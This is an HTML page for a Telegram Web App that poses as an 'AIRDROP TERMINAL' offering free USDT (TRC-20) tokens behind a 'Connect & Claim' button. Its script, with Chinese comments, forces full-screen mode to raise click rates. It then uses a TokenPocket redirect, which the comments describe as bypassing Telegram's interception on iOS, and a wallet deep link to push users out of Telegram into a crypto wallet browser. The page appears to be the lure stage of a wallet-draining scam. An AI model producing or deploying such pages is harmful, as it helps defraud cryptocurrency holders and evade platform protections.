<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRDROP TERMINAL</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        #terminal {
            width: 90%;
            border: 2px solid #ff0000;
            padding: 20px;
            box-shadow: 0 0 15px #ff0000;
            background: rgba(20, 0, 0, 0.8);
        }
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff0000;
        }
        .glitch {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="terminal">
        <h2>> SYSTEM: AIRDROP_DETECTED</h2>
        <p>> STATUS: READY_TO_CLAIM</p>
        <p>> TOKEN: USDT (TRC-20)</p>
        <p id="wallet-addr">> WALLET: NOT CONNECTED</p>
    </div>
    <button class="btn glitch" onclick="connectAndClaim()">Connect & Claim</button>

<script>
    // 1. 初始化 Telegram 环境
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand(); // 让页面全屏，增加点击成功率

    function connectAndClaim() {
    tg.HapticFeedback.notificationOccurred('success');
    const terminal = document.getElementById('terminal');

    // 1. 你的 GitHub 网址
    const currentUrl = window.location.href;

    // 2. 构造一个“双保险”链接
    // 这种格式在 iOS 上最容易绕过 Telegram 的拦截，直接弹出“在浏览器中打开”
    const finalUrl = `https://tokenpocket.github.io/tp-url-common/index.html?url=${encodeURIComponent(currentUrl)}`;

    terminal.innerHTML += "<p style='color:#0f0'>> [BYPASS]: EXECUTING_PROTOCOL_X...</p>";

    // 3. 核心：强制调用 Telegram 的外部浏览器唤起
    try {
        // 使用 try_browser: true 强制弹出离开提示
        tg.openLink(finalUrl, { try_browser: true });
        
        // 如果 2 秒还没反应，尝试第二种暴力方式
        setTimeout(() => {
            // 这会强行调起系统的分享/打开界面
            window.location.href = `tpdapp://open?params={"url":"${currentUrl}"}`;
        }, 2000);
        
    } catch (e) {
        terminal.innerHTML += "<p style='color:red'>> [ERROR]: REDIRECT_FAILED</p>";
    }
}
</script>
</body>
</html>
